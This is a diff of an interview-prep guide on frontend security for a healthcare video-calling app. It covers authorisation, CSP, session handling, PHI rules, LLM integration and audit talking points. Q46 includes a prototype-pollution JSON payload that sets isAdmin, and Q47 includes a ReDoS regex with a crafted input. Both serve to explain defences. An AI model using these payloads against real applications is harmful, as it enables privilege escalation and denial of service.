+**Example:** QA role can score calls (RBAC) but only in their tenant (attribute) and only for teams they belong to (relationship).
+
+**Say it like this:** "Roles give the baseline; tenant and ownership checks make it actually safe."
 
 ---
 
 **Q38. What is the frontend's role in authorisation?**
 
-**Short answer:** UX only: hide or disable actions the user can't take, guard routes, and build permission-aware components. The frontend is **never** the enforcement point: the API checks every request. Third-party tokens, such as LiveKit's, should carry scoped grants (which room, `canPublish`, `canSubscribe`).
+**Short answer:** UX only: hiding actions, guarding routes and permission-aware components; the API enforces everything.
+
+**Explanation:** Third-party tokens like LiveKit's should carry scoped grants.
+
+**Example:** The admin button is hidden for agents, and the admin API also returns 403 for them.
+
+**Say it like this:** "The UI hides what you can't do; the server makes sure you can't do it."
 
 ---
 
 **Q39. What are MFA and passkeys?**
 
-**Short answer:** MFA adds a second factor: a TOTP code, a push approval or a hardware key. **Passkeys** (WebAuthn) are public-key credentials bound to the website's origin, so they're **phishing-resistant**: a fake site simply can't use them.
+**Short answer:** MFA adds a second factor; passkeys (WebAuthn) are origin-bound public-key credentials that resist phishing.
+
+**Explanation:** A fake site can't use a passkey registered to the real domain.
+
+**Example:** Admins log in with a passkey; a phishing page on a lookalike domain gets nothing usable.
+
+**Say it like this:** "Passkeys are phishing-resistant by design, which makes them ideal for admin accounts."
 
 ---
 
 **Q40. What are the session management best practices?**
 
-**Short answer:**
+**Short answer:** Idle and absolute timeouts, re-authentication for critical actions, server-side invalidation on logout, cleared caches and cross-tab logout.
 
-- A short idle timeout for sensitive apps, plus an absolute timeout.
-- Re-authentication for critical actions.
-- Logout invalidates the server session and the refresh token.
-- Clear client caches on logout.
-- Sync logout across tabs.
+**Explanation:** Shared devices make these essential in healthcare.
+
+**Example:** After 15 minutes idle on a clinic tablet, the app logs out and clears all cached data.
+
+**Say it like this:** "Sessions end reliably: on idle, on logout, and in every tab."
 
 ---
 
@@ -531,163 +612,191 @@ Real systems combine RBAC with tenant and ownership checks.
 
 **Q41. How do you design a strict CSP?**
 
+**Short answer:** Nonce-based `script-src` with `'strict-dynamic'`, tight `connect-src`, `frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'none'`, and no `unsafe-inline` or `unsafe-eval`.
+
+**Explanation:** Roll out with `Report-Only` first, fix violations, then enforce.
+
+**Example:**
+
 ```text
-Content-Security-Policy:
-  default-src 'self';
-  script-src 'self' 'nonce-{random}' 'strict-dynamic';
-  style-src 'self' 'nonce-{random}';
-  img-src 'self' data: https://cdn.example.com;
-  connect-src 'self' https://api.example.com wss://livekit.example.com;
-  media-src 'self' blob:;
-  frame-ancestors 'none';
-  object-src 'none';
-  base-uri 'none';
-  form-action 'self';
-  report-to csp-endpoint;
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}' 'strict-dynamic';
+  connect-src 'self' https://api.example.com wss://livekit.example.com; frame-ancestors 'none';
+  object-src 'none'; base-uri 'none'; form-action 'self'; report-to csp-endpoint;
 ```
 
-**Short answer:** A Content Security Policy tells the browser which sources of scripts, styles and connections are allowed. Use a fresh random **nonce** per response, avoid `'unsafe-inline'` and `'unsafe-eval'`, and limit `connect-src` so injected code can't send data anywhere else. Roll it out with `Content-Security-Policy-Report-Only` first, fix the violations, then enforce it.
-
-**Say it like this:** "CSP is the safety net if XSS slips through. With nonce-based `script-src`, an injected `<script>` doesn't run, and a strict `connect-src` stops data being sent to an attacker's domain."
+**Say it like this:** "With a nonce-based CSP, injected scripts don't run, and a strict `connect-src` stops data going to an attacker."
 
 ---
 
 **Q42. What are Trusted Types?**
 
-**Short answer:** With `require-trusted-types-for 'script'`, dangerous DOM sinks like `innerHTML` accept only typed values created by approved policies. That eliminates whole classes of DOM-based XSS.
+**Short answer:** A CSP feature that makes dangerous DOM sinks accept only values created by approved policies.
+
+**Explanation:** It eliminates whole classes of DOM-based XSS.
+
+**Example:** With `require-trusted-types-for 'script'`, `el.innerHTML = userString` throws unless the string came from a sanitising policy.
+
+**Say it like this:** "Trusted Types turn every `innerHTML` into a reviewed, sanitised path."
 
 ---
 
 **Q43. What is Subresource Integrity (SRI)?**
 
+**Short answer:** An `integrity` hash on CDN scripts so the browser refuses modified files.
+
+**Explanation:** A compromised CDN can't inject code into your page.
+
+**Example:**
+
 ```html
-<script src="https://cdn.example.com/lib.js"
-        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
-        crossorigin="anonymous"></script>
+<script src="https://cdn.example.com/lib.js" integrity="sha384-…" crossorigin="anonymous"></script>
 ```
 
-**Short answer:** The browser hashes the downloaded file and refuses to run it if the hash doesn't match. A compromised CDN can't inject code.
+**Say it like this:** "SRI pins third-party files to an exact hash."
 
 ---
 
 **Q44. What are COOP, COEP and CORP, and what is cross-origin isolation?**
 
-**Short answer:** Cross-Origin-Opener-Policy isolates your window from cross-origin popups. Cross-Origin-Embedder-Policy plus Cross-Origin-Resource-Policy make the page `crossOriginIsolated`, which is required for `SharedArrayBuffer` and high-precision timers. They also mitigate Spectre-style side-channel leaks.
+**Short answer:** Headers that isolate your window and resources from other origins; together they enable `crossOriginIsolated`.
+
+**Explanation:** Isolation is required for `SharedArrayBuffer` and mitigates Spectre-style leaks.
+
+**Example:** `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Embedder-Policy: require-corp`.
+
+**Say it like this:** "Cross-origin isolation is needed for some high-performance APIs and adds defence against side channels."
 
 ---
 
 **Q45. How do you use `postMessage` securely?**
 
-**Short answer:** Validate `event.origin` against an allowlist and validate the message's shape. Never send sensitive data with `'*'` as the target origin.
+**Short answer:** Check `event.origin`, validate the message shape, and send with an exact target origin.
+
+**Explanation:** Any window can post messages, so unchecked handlers are an injection point.
+
+**Example:**
+
+```ts
+window.addEventListener('message', (e) => {
+  if (e.origin !== 'https://widget.partner.com') return;
+  if (typeof e.data?.type !== 'string') return;
+});
+```
+
+**Say it like this:** "Every message handler checks origin and shape, and nothing sensitive is posted to `'*'`."
 
 ---
 
 **Q46. What is prototype pollution?**
 
-**Short answer:** Merging untrusted JSON containing `__proto__` or `constructor.prototype` into an object modifies the prototype of *every* object, which can change app logic.
+**Short answer:** Merging untrusted JSON with `__proto__` keys modifies `Object.prototype`, affecting every object.
+
+**Explanation:** Use safe merges, `Object.create(null)`, schema validation, and frozen prototypes in sensitive contexts.
+
+**Example:**
 
 ```js
-const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
-deepMerge({}, payload);
-({}).isAdmin;  // true — every object is now "admin"
+deepMerge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
+({}).isAdmin; // true
 ```
 
-**Defences:** safe merge utilities, `Object.create(null)`, schema validation (Zod), and freezing prototypes in sensitive contexts.
+**Say it like this:** "Untrusted JSON is validated against a schema before merging, which blocks prototype pollution."
 
 ---
 
 **Q47. What is ReDoS?**
 
-**Short answer:** Regular expression denial of service. A regex with catastrophic backtracking, such as `/(a+)+$/`, run on crafted input freezes the main thread or the server. Avoid nested quantifiers, limit input length, and use safe regex libraries.
+**Short answer:** A regex with catastrophic backtracking that freezes the thread on crafted input.
+
+**Explanation:** Avoid nested quantifiers, limit input length, and use safe regex libraries.
+
+**Example:** `/(a+)+$/` on `'aaaaaaaaaaaaaaaaaaaaaaaa!'` takes exponential time.
+
+**Say it like this:** "Regexes on user input are reviewed for backtracking and inputs have length limits."
 
 ---
 
 **Q48. How do you secure file uploads?**
 
-**Short answer:**
+**Short answer:** Pre-signed URLs with limits, server-side content validation, malware scanning, storage outside the web root, `Content-Disposition: attachment`, and no inline user HTML or SVG on the main origin.
 
-- Use pre-signed upload URLs with size and type limits.
-- Validate the content on the server. Don't trust the file extension or the MIME type.
-- Scan for malware.
-- Store files outside the web root.
-- Serve them with `Content-Disposition: attachment`.
-- Never render user-uploaded HTML or SVG inline from your main origin.
+**Explanation:** Extensions and MIME types are client-controlled and can't be trusted.
+
+**Example:** An uploaded "invoice.pdf" that's actually HTML with a script is served as a download from a separate domain.
+
+**Say it like this:** "Uploads are validated on the server and served from a separate origin as downloads."
 
 ---
 
 **Q49. How do you handle rate limiting and abuse prevention?**
 
-**Short answer:**
+**Short answer:** Limits per user, IP and tenant with 429 and `Retry-After`, bot protection on public forms, and cost limits on LLM endpoints.
 
-- Rate limits per user, IP and tenant, returning 429 with `Retry-After`.
-- CAPTCHA or bot detection on public forms.
-- **Cost limits on LLM endpoints**, because AI calls cost real money.
+**Explanation:** AI endpoints cost real money per request, so quotas are essential.
+
+**Example:** The compliance chat allows 30 questions per user per hour and a monthly token budget per tenant.
+
+**Say it like this:** "Every expensive or public endpoint has limits, especially anything calling an LLM."
 
 ---
 
 **Q50. How do you secure source maps and error tracking?**
 
-**Short answer:** Upload source maps privately to Sentry instead of serving them publicly, and scrub PII and PHI from events before they're sent.
+**Short answer:** Upload source maps privately to Sentry, and scrub PII and PHI before events are sent.
+
+**Explanation:** Public source maps reveal internal code; error events can capture personal data.
+
+**Example:** CI uploads maps with `sentry-cli` and deletes them from the deployed assets.
+
+**Say it like this:** "Source maps go to Sentry, not the CDN, and events are scrubbed before they leave the browser."
 
 ---
 
 **Q51. How do you secure LLM integrations?**
 
-**Short answer:**
+**Short answer:** Server-side keys, treat output as untrusted, limit tool permissions, sanitise rendering, minimise data sent, have retention agreements, and rate-limit per tenant.
 
-- Keep API keys on the server only.
-- Treat model output as **untrusted input**, because of prompt injection.
-- Limit the permissions of any tools the model can call.
-- Sanitise rendered output.
-- Don't send unnecessary sensitive data to the provider, and have data-retention agreements.
-- Apply per-tenant rate limits.
-- Log usage without logging sensitive content.
+**Explanation:** Prompt injection can't be fully prevented, so design so it can't do damage.
+
+**Example:** The chat's retrieval only returns the user's tenant data, and the model has no tools that write data.
+
+**Say it like this:** "The model can only see what the user could see and can't take actions on its own."
 
 ---
 
 **Q52. What are the OWASP Top 10 categories?**
 
-**Short answer:**
+**Short answer:** Broken access control, cryptographic failures, injection, insecure design, security misconfiguration, vulnerable components, auth failures, integrity failures, logging and monitoring failures, and SSRF.
 
-- Broken access control
-- Cryptographic failures
-- Injection
-- Insecure design
-- Security misconfiguration
-- Vulnerable or outdated components
-- Identification and authentication failures
-- Software and data integrity failures
-- Logging and monitoring failures
-- SSRF
+**Explanation:** Names shift between editions; broken access control has been number one.
 
-The category names shift a little between editions.
+**Example:** Our audit's findings mapped mostly to broken access control, cryptographic failures (token storage) and logging failures (PHI in logs).
+
+**Say it like this:** "I use the OWASP Top 10 as a checklist, and broken access control is where I look first."
 
 ---
 
 **Q53. How do you threat-model a feature?**
 
-**Short answer:**
+**Short answer:** Identify assets, actors, entry points and data flows, apply STRIDE, and prioritise mitigations.
 
-1. Identify the **assets**: PHI, recordings, tokens.
-2. Identify the **actors**: patient, provider, interpreter, admin, attacker.
-3. Identify the **entry points**: APIs, webhooks, uploads, LiveKit.
-4. Map the **data flows**.
-5. Apply **STRIDE**: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.
-6. Prioritise the mitigations.
+**Explanation:** STRIDE: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.
 
-**Say it like this:** "For the call-recording feature, I'd ask: who can start a recording, where is it stored, who can view it, and how could each step be abused? Then I'd go through STRIDE, list the risks, and fix the high-impact ones first."
+**Example:** For call recording: who can start it (spoofing), where it's stored (disclosure), who can view it (elevation), and whether access is logged (repudiation).
+
+**Say it like this:** "I walk the feature's data flow and ask how each step could be abused, then fix the high-impact risks first."
 
 ---
 
 **Q54. What security testing belongs in the pipeline?**
 
-**Short answer:**
+**Short answer:** SAST, dependency and secret scanning, DAST, an authorisation test matrix and periodic penetration tests.
 
-- SAST (CodeQL, Semgrep).
-- Dependency scanning and secret scanning.
-- DAST (OWASP ZAP).
-- An automated authorisation test matrix.
-- Periodic penetration tests.
+**Explanation:** Automated checks catch regressions; pentests catch what automation misses.
+
+**Example:** CodeQL and Dependabot on every PR, a role × endpoint test suite in CI, and an annual pentest.
+
+**Say it like this:** "Security checks run on every PR, and the authorisation matrix guarantees fixed issues stay fixed."
 
 ---
 
@@ -695,68 +804,67 @@ The category names shift a little between editions.
 
 **Q55. What is PHI, and which regulations apply?**
 
-**Short answer:** Protected Health Information: health data linked to an identifiable person. That includes names with medical context, dates of birth, medical record numbers, appointment details, the contents of medical conversations, and recordings. In the US it's governed by **HIPAA**. Other regions have their own laws; GDPR, for example, treats health data as a "special category". Know the basics, and don't overclaim legal expertise.
+**Short answer:** Protected Health Information: health data linked to an identifiable person; in the US governed by HIPAA, with other laws like GDPR elsewhere.
+
+**Explanation:** It includes names with medical context, record numbers, appointment details, conversations and recordings. Know the basics without overclaiming legal expertise.
+
+**Example:** A recording of a patient's interpreted consultation is PHI.
+
+**Say it like this:** "PHI is any health information tied to a person, and our design treated it as the most sensitive data we had."
 
 ---
 
 **Q56. What are the frontend rules for PHI?**
 
-**Short answer:**
+**Short answer:** No PHI in browser storage, URLs, titles, analytics, logs or error reports; idle logout and cache clearing; no trackers on PHI screens; TLS and secure cookies; server-side audit logging.
 
-- **No PHI in browser storage:** localStorage, sessionStorage, IndexedDB or service-worker caches.
-- **No PHI in URLs, page titles, analytics events, logs or error reports.**
-- Session timeout and auto-logout on idle, and clear caches on logout.
-- Mask sensitive fields where appropriate, and keep PHI out of push notifications and lock screens.
-- **No third-party trackers on PHI screens.**
-- TLS everywhere, and secure cookies.
-- Audit logging of every access, on the server.
+**Explanation:** Assume anything stored or sent to a third party could leak.
 
-**Say it like this:** "My rule of thumb: assume anything the browser stores or sends to a third party could leak, so PHI only lives in memory while it's on screen. Even the page title says 'Call details', not the patient's name, because titles end up in browser history."
+**Example:** The page title says "Call details", not the patient's name, because titles end up in browser history.
+
+**Say it like this:** "PHI only lives in memory while it's on screen; it never reaches storage, URLs or third parties."
 
 ---
 
 **Q57. How do you use Sentry and monitoring with PHI?**
 
+**Short answer:** `sendDefaultPii: false`, scrub in `beforeSend` and `beforeBreadcrumb`, disable or mask session replay, avoid console breadcrumbs, and sign a data-processing agreement.
+
+**Explanation:** Error tools capture request bodies, inputs and console output by default.
+
+**Example:**
+
 ```ts
-Sentry.init({
-  dsn,
-  sendDefaultPii: false,
-  beforeSend(event) {
-    delete event.request?.data;
-    if (event.user) event.user = { id: event.user.id };    // no email/name
-    return scrubPhi(event);
-  },
-  beforeBreadcrumb(b) { return b.category === 'console' ? null : b; },
-  replaysSessionSampleRate: 0,                             // or full masking
-});
+Sentry.init({ dsn, sendDefaultPii: false,
+  beforeSend(e) { delete e.request?.data; if (e.user) e.user = { id: e.user.id }; return e; },
+  beforeBreadcrumb: (b) => (b.category === 'console' ? null : b) });
 ```
 
-**Short answer:** Set `sendDefaultPii: false`, scrub events in `beforeSend` and `beforeBreadcrumb`, disable session replay or mask it completely, avoid console breadcrumbs, and sign a data-processing agreement with the vendor.
+**Say it like this:** "Error tracking is a common PHI leak, so scrubbing is configured before the first event is ever sent."
 
 ---
 
 **Q58. How do you handle recordings and transcripts?**
 
-**Short answer:**
+**Short answer:** Encryption at rest, short-lived signed URLs, role-based access, an audit trail, retention policies and recorded consent.
 
-- Encrypt them at rest.
-- Give access only through short-lived signed URLs.
-- Use role-based access.
-- Keep an audit trail of who viewed or downloaded what.
-- Apply retention policies.
-- Capture consent before recording.
+**Explanation:** Each access is logged so you can answer "who listened to this call?".
+
+**Example:** The audio player requests a 5-minute signed URL each time; the server logs the viewer.
+
+**Say it like this:** "Recordings are encrypted, accessed through expiring links, and every access is audited."
 
 ---
 
 **Q59. How do you secure LiveKit and WebRTC?**
 
-**Short answer:**
+**Short answer:** Short-lived, role-scoped tokens, opaque room names, built-in DTLS-SRTP encryption (plus E2EE where required), TURN over TLS and validated webhooks.
 
-- Short-lived access tokens with minimal grants per role.
-- Room names that contain no PHI.
-- WebRTC encrypts media in transit by default (DTLS-SRTP). Consider end-to-end encryption where required.
-- TURN over TLS.
-- Validate webhook signatures on the server.
+**Explanation:** Tokens determine who can publish or subscribe in which room.
+
+**Example:** An observer's token has `canPublish: false`, expires in 10 minutes, and the room is named `rm_8f2c…`.
+
+**Say it like this:** "Tokens are minted on the server with minimal grants, and room names never contain patient information."
 
 ---
 
@@ -764,62 +872,85 @@ Sentry.init({
 
 **Q60. A pentest found JWTs in localStorage. What do you change?**
 
-**Answer:**
+**Short answer:** Move to HttpOnly cookies or a BFF, short-lived tokens with rotation, add a CSP, and migrate users at next login.
 
-1. Move tokens to HttpOnly, Secure, SameSite cookies, or to a BFF.
-2. Make access tokens short-lived, with refresh rotation.
-3. Add a CSP to reduce XSS risk.
-4. Migrate users smoothly: issue the new cookies at the next login, and delete the old tokens from storage.
+**Explanation:** Delete the old tokens from storage during migration.
+
+**Example:** On next login the server sets an HttpOnly session cookie and the client removes `localStorage.token`.
+
+**Say it like this:** "Tokens move out of JavaScript's reach, and a CSP reduces the chance of XSS in the first place."
 
 ---
 
 **Q61. Agents can see other teams' calls by changing the URL.**
 
-**Answer:** This is IDOR. Fix it in three steps:
+**Short answer:** It's IDOR: add server-side tenant, team and ownership checks on every endpoint, add a test matrix, and check logs for exploitation.
 
-1. Add server-side authorisation by tenant, team and ownership on **every** endpoint.
-2. Write automated authorisation tests: a matrix of role × endpoint × tenant.
-3. Check the audit logs to see whether it was exploited, and follow the incident process if it was.
+**Explanation:** Follow the incident process if it was exploited.
+
+**Example:** A FastAPI dependency `require_call_access(call_id, user)` on every call route, tested for each role.
+
+**Say it like this:** "Fix it on the server, prove it with tests, and investigate whether it was used."
 
 ---
 
 **Q62. Marketing wants a third-party chat widget on the patient dashboard.**
 
-**Answer:** A script on your page can read everything on that page, including PHI. So keep the widget off PHI pages, or isolate it in a sandboxed iframe on a separate origin. Add it to the CSP allowlist only where needed, and require a vendor data agreement.
+**Short answer:** Keep it off PHI pages or isolate it in a sandboxed iframe on another origin, with a CSP allowlist and a vendor agreement.
+
+**Explanation:** A script on the page can read everything on the page.
+
+**Example:** The widget appears on marketing and help pages only, not the call history screen.
+
+**Say it like this:** "Any third-party script on a PHI page can read PHI, so it either stays off those pages or is isolated."
 
 ---
 
 **Q63. LLM-generated summaries show raw HTML from transcripts.**
 
-**Answer:** The model output is being rendered as HTML, which is an XSS risk. Sanitise it with DOMPurify, or use a markdown renderer with HTML disabled. Strip links or add `rel="noopener noreferrer"`, and test with injection payloads in the transcripts.
+**Short answer:** Sanitise the output or render markdown with HTML disabled, restrict links, and test with injection payloads.
+
+**Explanation:** Model output is untrusted input and can carry injected markup.
+
+**Example:** `react-markdown` with no raw HTML plugin, plus `rel="noopener noreferrer"` on links.
+
+**Say it like this:** "Model output goes through the same sanitising as any user input."
 
 ---
 
 **Q64. A user is logged out in one tab but still active in another.**
 
-**Answer:** Broadcast logout with BroadcastChannel or the `storage` event. The server invalidates the refresh token, so other tabs get a 401 on their next request and redirect to login.
+**Short answer:** Broadcast logout via BroadcastChannel or the storage event, and invalidate the refresh token on the server.
+
+**Explanation:** Other tabs then fail their next request with 401 even if they missed the broadcast.
+
+**Example:** `new BroadcastChannel('auth').postMessage('logout')`.
+
+**Say it like this:** "Logout is broadcast to every tab and enforced on the server."
 
 ---
 
 **Q65. You must allow your app to be embedded in a partner's portal.**
 
-**Answer:**
+**Short answer:** Allow the partner in `frame-ancestors`, use `SameSite=None; Secure` cookies or a token handoff, check origins in `postMessage`, and review clickjacking risks.
 
-- Set `frame-ancestors https://partner.example`.
-- Use `SameSite=None; Secure` cookies, or hand off a token.
-- Use `postMessage` with origin checks.
-- Review the clickjacking risks.
+**Explanation:** Third-party cookies may be blocked, so a token handoff is often more reliable.
+
+**Example:** `Content-Security-Policy: frame-ancestors https://portal.partner.com`.
+
+**Say it like this:** "Embedding is opt-in per partner, with origin-checked messaging and explicit framing rules."
 
 ---
 
 **Q66. Error tracking captured patient names in breadcrumbs.**
 
-**Answer:**
+**Short answer:** Ask the vendor to purge the events, add scrubbing rules, fix the logging code, add lint rules or tests, and document the incident.
 
-1. Ask the vendor to purge the events.
-2. Add scrubbing rules.
-3. Review the logging code, and add lint rules or tests that stop PHI being logged.
-4. Document it as an incident.
+**Explanation:** It's a data incident, so it follows the incident process.
+
+**Example:** A `no-console-pii` lint rule and a unit test asserting scrubbed events.
+
+**Say it like this:** "Contain, purge, fix the cause and prevent recurrence, documented as an incident."
 
 ---
 
@@ -827,39 +958,58 @@ Sentry.init({
 
 **Q67. "Walk me through your security audit."**
 
-**Say it like this:** "I scoped it to the React app, the FastAPI APIs, authentication and client-side storage. First, I built a threat model: the roles, the data flows, and where PHI lived. Then I worked through an OWASP ASVS-style checklist and tested every endpoint as every role and tenant. I reviewed the token lifecycle and storage, and searched logs, browser storage and analytics for PHI. Each finding got a severity, a fix and a regression test, and then we re-audited. I can walk through three specific findings in detail."
+**Short answer:** Scope, threat model, checklist, per-role and per-tenant endpoint testing, token review, PHI search, severity rating, fixes with tests, and a re-audit.
 
-*Prepare three real findings in the form problem → impact → fix → how you prevented it coming back.*
+**Explanation:** Prepare three real findings as problem → impact → fix → prevention.
+
+**Example:** "Permissions enforced only in the UI → any user could call admin APIs → permission dependency on every route → role × endpoint test matrix."
+
+**Say it like this:** "I mapped roles and PHI flows, tested every endpoint as every role and tenant, reviewed tokens and storage, fixed issues with tests, and re-audited."
 
 ---
 
 **Q68. "What were the 8 critical issues?"**
 
-**Answer guidance:** Only describe real issues you worked on. Typical categories to map them to:
+**Short answer:** Describe only real ones, mapped to categories like UI-only RBAC, missing tenant scoping, tokens in localStorage, no rotation, long-lived tokens, PHI in logs or storage, and missing headers.
 
-- RBAC enforced only in the UI.
-- Missing tenant scoping (IDOR).
-- Tokens in localStorage.
-- No refresh rotation or revocation.
-- Long-lived tokens.
-- PHI in logs or Sentry.
-- PHI in browser storage.
-- Missing security headers.
+**Explanation:** Interviewers probe each one, so pick ones you understand deeply.
+
+**Example:** "Three were access control, two token handling, two PHI exposure in logs and storage, and one missing security headers." *(Use your real breakdown.)*
+
+**Say it like this:** "They fell into access control, token handling and PHI exposure; I can go deep on any of them."
 
 ---
 
 **Q69. "What does 'cut findings by 85%' mean exactly?"**
 
-**Say it like this:** "It's the number of open findings in the re-audit compared with the initial audit. For example, 40 findings down to 6. The remaining ones were lower severity and tracked with owners and dates. I can explain which ones remained and why." *(Use your real numbers, and say whether you counted raw findings or weighted them by severity.)*
+**Short answer:** The number of open findings in the re-audit versus the initial audit.
+
+**Explanation:** State whether it's a raw count or severity-weighted, and what remained.
+
+**Example:** "40 open findings down to 6, all lower severity with owners and dates." *(Use your real numbers.)*
+
+**Say it like this:** "It's open findings before and after, and the remaining ones were low severity and tracked."
 
 ---
 
 **Q70. "How did you handle RBAC in FastAPI and React together?"**
 
-**Say it like this:** "On the server, every route had a permission dependency that checked the role, the tenant and resource ownership. That was the real enforcement. On the client, the same permission list drove navigation, route guards and button visibility, purely for UX. We kept them in sync from one source and added an authorisation test matrix that tried every role against every endpoint in CI."
+**Short answer:** FastAPI enforced role, tenant and ownership on every route; React used the same permission list for navigation and buttons; a test matrix verified it.
+
+**Explanation:** One source of truth for permissions kept frontend and backend consistent.
+
+**Example:** `Depends(require_permission("calls:score"))` on the route; `can(role, 'calls:score')` in the UI.
+
+**Say it like this:** "The server enforced, the UI reflected, and tests proved every role against every endpoint."
 
 ---
 
 **Q71. "How are LiveKit tokens secured?"**
 
-**Say it like this:** "Tokens are generated on the server, per user and per room, with a short expiry and minimal grants. An interpreter can publish, while an observer can only subscribe. The client never constructs tokens, and room names are opaque IDs with no patient information."
+**Short answer:** Generated on the server per user and room, short-lived, with minimal grants, and opaque room names.
+
+**Explanation:** The client never constructs tokens or sees the API secret.
+
+**Example:** An interpreter's token allows publish and subscribe in one room for 10 minutes; an observer's allows subscribe only.
+
+**Say it like this:** "Tokens are minted server-side with the least privilege each role needs and expire quickly."
